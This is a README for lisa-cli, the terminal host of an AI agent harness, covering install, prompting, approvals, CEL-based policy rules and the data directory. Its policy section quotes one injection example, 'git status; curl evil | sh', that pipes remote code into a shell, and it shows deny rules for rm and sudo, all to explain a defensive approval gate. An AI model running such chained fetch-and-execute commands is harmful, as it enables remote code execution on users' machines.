# lisa-cli

[Lisa Harness](https://github.com/Lisa-Harness/lisa) CLI host.

## Releases

Follow the [coordinated release checklist](https://github.com/Lisa-Harness/lisa#publishing-releases).
The `Publish` workflow runs CI, builds and checks the `lisa-cli` distributions,
and, for a `v<version>` tag, publishes to PyPI and creates a GitHub release with
the wheel and source distribution attached. A manual run validates without
publishing. Configure the PyPI pending publisher before the first tag.
Framework and optional pack dependencies must be published first: CI uses
`uv sync --no-sources --extra dev` to test registry dependencies rather than
the local development overrides.

## Install

### Give Lisa model access

The Lisa Harness CLI host supports several providers out-of-the-box.
To use one (or more), set the requisite environment variables:

| Provider       | Environment variables                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------- |
| `openai`       | `LISA_OPENAI_API_KEY`                                                                          |
| `azure_openai` | `LISA_AZURE_OPENAI_ENDPOINT`, `LISA_AZURE_OPENAI_API_KEY`, `LISA_AZURE_OPENAI_API_VERSION`     |
| `anthropic`    | `LISA_ANTHROPIC_API_KEY`, `LISA_ANTHROPIC_BASE_URL`, `LISA_ANTHROPIC_VERSION`                  |
| `google`       | `LISA_GOOGLE_API_KEY`, `LISA_GOOGLE_API_BASE_URL`                                              |
| `openrouter`   | `LISA_OPENROUTER_API_KEY`, `LISA_OPENROUTER_BASE_URL`                                          |
| `aws`          | `LISA_AWS_ACCESS_KEY_ID`, `LISA_AWS_SECRET_ACCESS_KEY`, `LISA_AWS_REGION`                      |
| `ollama`       | `LISA_OLLAMA_HOST` *(optional)*                                                                |

Either in the shell that will run Lisa or,
Create the `~/.lisa` directory and copy/edit the [.env.example](.env.example) into it.

### Run the installer

Linux or Mac:

```bash
curl -fsSL https://raw.githubusercontent.com/Lisa-Harness/lisa-cli/main/install.sh | bash
```

Windows:

```pwsh
irm https://raw.githubusercontent.com/Lisa-Harness/lisa-cli/main/install.ps1 | iex
```

The installer accepts the same options as a direct `uv tool install`
(e.g. `--provider ollama,openai`, `--source local --lisa-repo ~/Code/lisa`).

Or with pip / uv directly:

```bash
# Either
pip install lisa-cli
# or
uv tool install lisa-cli
```

However,
you will then also need to run `lisa models discover && lisa models apply`
after configuring your environment for model access per above.

## Usage

```bash
lisa            # show help (every command is one-shot)
lisa prompt "summarize the thread"   # run a single turn
lisa prompt     # no args: type the message in the editor (no shell quoting)
lisa verify     # run the diagnostic smoke check
lisa --help     # show all commands
```

`lisa verify` expects a configured model manifest; run `lisa models discover`
and `lisa models apply` first. CI supplies a static manifest for its offline
installation smoke check and does not invoke a model provider.

### Prompting (`prompt` with stdin, the editor, and `--raw`)

`prompt` takes its message from three sources, in fallback order. Quote
rules differ per source — pick the one that fits:

**1. Arguments (shell rules apply).** Multiple words are joined with spaces,
so short prompts work unquoted; quote only to preserve inner spaces or
literal quote characters:

```bash
lisa prompt fix the config parser
lisa prompt "summarize the thread"
```

The shell still owns argv: an apostrophe (`lisa prompt fix what's broken`)
or a quote you wanted in the message needs shell quoting, and `$(...)`
expands before lisa even runs.

**2. No arguments on a terminal (lisa-managed input; no shell rules).**
`lisa prompt` with nothing to send drops into an input editor. Quote
characters, backticks, and apostrophes are collected literally — no
escaping — and Enter submits (Alt+Enter or Ctrl-J adds a line; Ctrl-C
aborts with the SIGINT exit code). `$(command)` is expanded here as shell
substitution (nesting works; a failed command is a loud error, exit 2;
escape with `\$(` for a literal `$(`). Single-quoted spans don't expand
and backticks stay literal. Submitted prompts persist to
`<data-dir>/state/prompt_history.txt` for Up-arrow reuse. The editor uses
prompt_toolkit when the optional `lisa-cli[prompt]` extra is installed,
otherwise a plain line-at-a-time reader (Ctrl-D — or Ctrl-Z then Enter on
Windows — sends).

**3. Piped stdin (payload rules).** When stdin is not a tty its contents
are attached ahead of your instruction, so config/data can flow through
the model into another command. A quoted heredoc is the fully literal
power path:

```bash
cat /etc/whatever.conf | lisa prompt "recommend improvements"
sudo systemctl status whatever 2>&1 | lisa prompt -r "fix it for me." > whatever.conf.new
lisa prompt <<'EOF'
fix the "config" parser for $(this) host: it can't handle 'quoted values'
EOF
```

`-r`/`--raw` writes the response verbatim to stdout — no Rule header, no
Markdown re-render, no `⚡` footer — moves activity output to stderr, and
prepends an output contract to the turn so the model emits only the requested
result (no preamble or commentary). Combine with `-q` to also suppress the
stderr activity lines. `--no-stdin` disables stdin attachment (use when a
foreground pipe should not be consumed). `-q -r` = only the raw response on
stdout.

An unresolved approval is a hard stop: the request id is durable,
the process prints the required decision commands to stderr and exits
with code `3`, so pipelines never mistake an un-decided approval for a
completed turn. Decide it from the same shell — no session needed — and re-run:

```bash
lisa approve <request-id>                    # decide; no new model turn
lisa approve <request-id> --remember "git status"  # decide + persist allow rule
lisa deny <request-id>
```

(A bare `lisa approve` with no id resolves to the single pending request.
A pre-armed decision also works in one shot:
`lisa prompt --approve <request-id> "continue the task"` dispatches the
approval first — its own typed dispatch to the approval core — then runs the
turn message as a second dispatch on the same runtime. `--deny <id>` works
the same way; both accept bare `pending` to target the single pending
request.)

A model yield — the turn ends with the model asking you a question instead of
producing a result — is the same contract: the question prints to stderr, stdout
gets nothing, and the process exits with code `4`. The raw-mode contract tells
the model to make the best-supported inference from the provided material and
state assumptions in a trailing comment instead of asking; when even that is
impossible, re-run with the missing information included in the prompt.

### Live activity display

On a tty, `prompt` keeps the turn visible while the model works: a one-line
status (turn · mode · model · in-flight tool · thinking size · iteration ·
tool budget · elapsed) with a trailing spinner, plus a bounded stream box
that scrolls only the tail of the model's live output — so long generations
show motion without pushing prior detail up the scrollback. Reasoning-model
calls get a calmer spinner and a live `thinking Nk` meter. Streamed tool
output (e.g. a bash command's stdout) renders in its own bounded box — the
tail of the in-flight output, with elided-line counts in the title — instead
of printing every line to scrollback; a failed tool flushes the tail so
error context survives, and piped/non-tty runs keep the full per-line
transcript. The final answer always re-renders once with full Markdown
formatting under a `Response · model · turn N` rule, followed by the `⚡`
footer (time · turn · tools · models · tokens · cost). The `turn N` figure
is the thread's global turn index — the same number stamped on the thread
entry — so a result can be replayed with `lisa last N` or inspected with
`lisa debug N` without counting from the top. `lisa last` labels its replay
with that number too: a `Response · turn N` rule on a tty, a `[ turn N ]`
header before piped/replayed output.

`--streaming` controls what the box shows: `none` (spinner only), `stage`,
`text` (the forming answer), or `hybrid` (the model's thinking, default).
Non-tty output (pipes, redirects, CI) never renders any of it — just the
completed event lines and the final answer.

### Host commands (real subcommands — no slash grammar at the CLI)

Host operations are typed Typer commands, full stop. The CLI parses each
flag once and passes values across the host seam — no slash-command string
is ever synthesized or re-parsed, and a CEL `--when` expression arrives
verbatim (no quoting contract):

```bash
lisa debug [N] | last [N]                              # turn inspection
lisa models show | discover --force | apply
lisa pack list | install <spec> | uninstall <pkg> | update [--all]
lisa policy | policy mode trust | policy bare off
lisa policy rule list | add allow --when '<CEL>' | remove allow:1
lisa approve <id> [--remember <prefix>] | deny <id>
```

Pack-registered host commands resolve as **dynamically generated
subcommands** (real `--help`, real shell completion, same runtime options)
— the recovery pack's `/stalls`, `/retry`, `/resume` are simply:

```bash
lisa stalls
lisa retry <id>
lisa resume
```

A leading `/` (a runtime slash command) is a friendly usage error pointing
at the named subcommand — `lisa /settings` suggests `lisa settings`.
The `lisa run '<slash>'` escape hatch is **deprecated** (hidden) and will
be removed after one release.

### Approvals

By default, commands execute without an approval prompt only when the bash pack
reports a working, contained Bubblewrap sandbox — or when an explicit `allow`
rule matches (rules are evaluated ahead of the sandbox downgrade). Missing,
degraded, or unknown sandbox state fails closed and shows an approval panel
instead. Decide with the top-level host command (the request id survives the
process boundary):

```bash
lisa approve <request-id>                                  # decide only
lisa deny <request-id>
lisa approve <request-id> --remember "git status"          # decide + persist narrow allow
```

The panel badges the sandbox state and shows the policy reason and effect tier
that fired, so you can see which rule or guard drove the prompt. `--remember`
persists an allow rule scoped to the tool and the command prefix — the default
prefix is the command's first two tokens (`git status` from `git status -sb`) —
rather than granting broad shell access; manage the accumulated rules with
`lisa policy rule list` and `lisa policy rule remove`.

### Policy (`lisa policy`)

The approval policy is a CEL-backed YAML document at
`<data_dir>/config/policy.yaml` that decides which actions need operator
approval before they run. Inspect and change it from Typer commands — no
model turn or hand-editing (the host owns every policy write):

```bash
lisa policy                               # show the active document (+ any load errors)
lisa policy mode trust                   # auto-allow write/execute (ask|trust|plan)
lisa policy bare off                     # stop prompting for unsandboxed execute
lisa policy rule list                    # rules with their remove addresses
lisa policy rule add allow --tool bash_run --when 'action.argv[0] == "git" && action.argv.size() <= 2'
lisa policy rule add deny --when '("rm" in action.argv) || ("sudo" in action.argv)'
lisa policy rule remove allow:1          # drop rule 1 of the allow list
```

Changes take effect immediately — the engine re-reads `policy.yaml` on every
approval request. The default document is `mode: ask`, `sandbox_downgrade:
true`, `bare_requires_approval: true`, and no rules.

**Rules.** Each entry under `allow`/`ask`/`deny` is a matchers object; all
present matchers must match (a rule with no matchers matches nothing, and a
`when`-only rule is valid):

| Matcher | Matches |
| --- | --- |
| `tool` | exact tool id (e.g. `bash_run`) |
| `effect` | exact effect kind: `read` · `write` · `execute` · `external_write` |
| `pack` | exact owning pack id |
| `command_prefix` | the shell command starts with this string |
| `when` | a [CEL](https://github.com/google/cel-spec) boolean expression over the invocation |

The `when` expression is the powerful matcher. Its bindings cover the
structural facts (`action.tool`, `action.effect`, `action.pack`), the command
(`action.command` and `action.argv` — the command tokens, so token matching
closes the `command_prefix` shell-metacharacter bypass such as
`git status; curl evil | sh`), the full `action.parameters` map, `identity.*`
(workspace/user/surface/mode/scope), and `containment` (the resolved sandbox
state). CEL has no side effects and no I/O, so expressions are safe to
evaluate on every approval request. CEL string literals use double quotes, so
single-quote the YAML value; on `rule add`, pass the expression after `--when`
unquoted or in one outer shell quote — the raw tail is kept verbatim, inner
literals included:

```yaml
allow:
  - tool: bash_run
    when: 'action.argv[0] == "git" && action.argv.size() <= 2'
deny:
  - when: '("rm" in action.argv) || ("sudo" in action.argv)'
```

**Decision order.** For each approval-gated action the ladder is fixed and
short-circuiting: `deny` rules (loud — a tool error the model can reroute on,
never a silent skip), then `ask` rules, then `allow` rules, then the sandbox
downgrade (a `contained` `execute` auto-approves even under `plan` mode;
degraded, none, and unknown containment fail closed), then the mode fallback
(`read` always allows, `plan` denies every effectful action, `trust` allows
`write`/`execute`, `ask` prompts). Auto-approvals are auditable and capped at
10 per turn — beyond the cap the host prompts instead of continuing.

Two things never ride the dial: an `external_write` escapes the sandbox by
definition, so auto-approving one takes an explicit allow rule, and an
unsandboxed `execute` prompts even under `trust` while
`bare_requires_approval` is on (`policy bare on|off`).

**Fail closed.** A missing, invalid, or non-mapping `policy.yaml` — or one
whose `when` expression does not compile — loads as ask-mode defaults with no
rules, and `lisa policy` renders the load error. An expression that
fails at evaluation time prompts instead of skipping the rule (a skipped
`deny` would be an allowed `rm`). `rule add` compile-checks `--when` before
the write, so a bad add is rejected rather than poisoning the document.

The full authoring reference — the bindings table, more rule examples,
containment states, and quoting rules — lives in
`../lisa/docs/POLICY_GUIDE.md` in the framework checkout.

### Lazy `prompt` routing

Set `LISA_PROMPT_UNKNOWN=1` to let an unrecognized first positional become
the `prompt` message, so you can skip typing `prompt` for ad-hoc one-shots:

```bash
LISA_PROMPT_UNKNOWN=1 lisa "do something"
```

Routing is Click's own command resolution (a custom Typer group resolves
unknowns) — no argv rewriting happens before the parser. Registered
subcommands (`verify`, `pack`, `models`, …) and generated pack commands
(`stalls`, `retry`, …) are never rerouted, so the env var is safe to leave
on. Runtime options belong to each subcommand (`lisa prompt --log-level
debug …`). Prompt-only flags (`-r/--raw`, `-q/--quiet`, `--no-stdin`)
appearing before the positional parse at group level and ride onto the
injected turn, so `lisa -r "fix it"` behaves as `lisa prompt -r "fix it"`,
and a bare `lisa -r` (no positional, routing on) also opens the editor
with the raw contract applied to the submitted text.

### Profiles (`--profile`, `LISA_PROFILE`)

A **profile** is a named sub-workspace of the data dir:
`~/.lisa/profiles/<name>`. It isolates the whole category tree below —
threads, `memory.db`, `models.yaml`, `policy.yaml`, approvals, `files/` —
while **sharing the base packs venv**, so packs are installed once and
discovered from every profile:

```text
~/.lisa/                          # base data dir
├── config/  state/  data/  cache/  logs/  run/
├── venv/                         # packs venv — shared by all profiles
└── profiles/
    └── ansible/                  # LISA_PROFILE=ansible (or --profile ansible)
        ├── config/  state/  data/  cache/  logs/  run/
        └── (no venv/ — resolves to the base venv)
```

```bash
lisa --profile ansible            # one-shot: use the 'ansible' profile
LISA_PROFILE=ansible lisa         # env var form (persistent for the shell)
lisa --profile ansible verify     # works on every subcommand
```

Precedence: `--data-dir` (explicit) > `LISA_DATA_DIR` > `--profile` /
`LISA_PROFILE` > `~/.lisa`. A fresh profile starts empty (defaults, like a
fresh install); seed it from the base dir when you want a head start:

```bash
mkdir -p ~/.lisa/profiles/ansible/config
cp ~/.lisa/config/models.yaml ~/.lisa/profiles/ansible/config/
```

Note: a profile switches the auto-discovered `config/session_context.md`
like any other config file, but an explicit `--session-context` flag or
`LISA_SESSION_CONTEXT_PATH` still takes precedence over whatever the
profile carries.

(The profile name must be a single path-safe segment — letters, digits,
`-`, `_`, `.`.)

### Data directory layout

The data dir (base or profile) groups everything into lifecycle
categories; the names live in one place (`sdk.layout`):

```text
~/.lisa/
├── config/    models.yaml · policy.yaml · session_context.md
│              (mcp_servers.yaml and overlays/ appear when a pack or your
│               setup adds them — they are optional, not seeded by default)
├── state/     installed-packs.json · state.json · approvals.json ·
│              recovery-items.json · code-change-artifacts.json ·
│              repl_history.txt · models.proposed.yaml
│              (written as needed; a clean install may not have them all —
│               state.json and code-change-artifacts.json appear on first use)
├── data/      memory.db · threads/ · files/ · backups/
├── cache/     fetch/ · layers/    (rm-safe)
├── logs/      host.jsonl · token-usage.jsonl · mcp/<server_id>.jsonl
│              · pack logs (e.g. bash-<session>.log, bwrap-<session>.log)
├── run/       per-session execution state, keyed by session hash (rm-safe):
│              <key>/ jobs/ · scratch/ · profile/ · sandbox-facts.json ·
│              per-session logs (e.g. bash-<key>.log)
├── venv/      packs venv (shared with profiles)
└── .env
```

`cache/` and `run/` can be deleted at any time. A backup of `config/`,
`state/`, and `data/` captures everything durable.

## Development

This repo is a uv workspace whose only member is `hosts/cli/` (src layout:
`hosts/cli/src/hosts/cli/`), matching the framework packages in the sibling
`../lisa` checkout. The layout is:

```text
Code/
├── lisa/              # framework (kernel, sdk, mcp_server, host)
└── lisa-cli/          # this repo
```

Until the framework packages are published to PyPI, a clone needs the
sibling framework checkout:

```bash
git clone https://github.com/Lisa-Harness/lisa-cli.git
git clone https://github.com/Lisa-Harness/lisa.git

cd lisa-cli
# edit pyproject.toml: uncomment the lisa-* path sources (sibling ../lisa)
uv sync --extra dev
uv run pytest -m "not live"
uv run lisa --help
```

## Architecture

`lisa-cli` wraps the transport-neutral `runtime` package (from `lisa-harness-runtime`)
with a Typer + Rich terminal interface. Every command is a one-shot process; turns
run through `lisa prompt` and its `PromptTransport` renders the turn trajectory to
scrollback. The CLI implements `TransportCallbacks`; the runtime never imports
Rich, Typer, or any transport-specific code.

See `../lisa/docs/BOUNDARIES.md` for the full architecture.
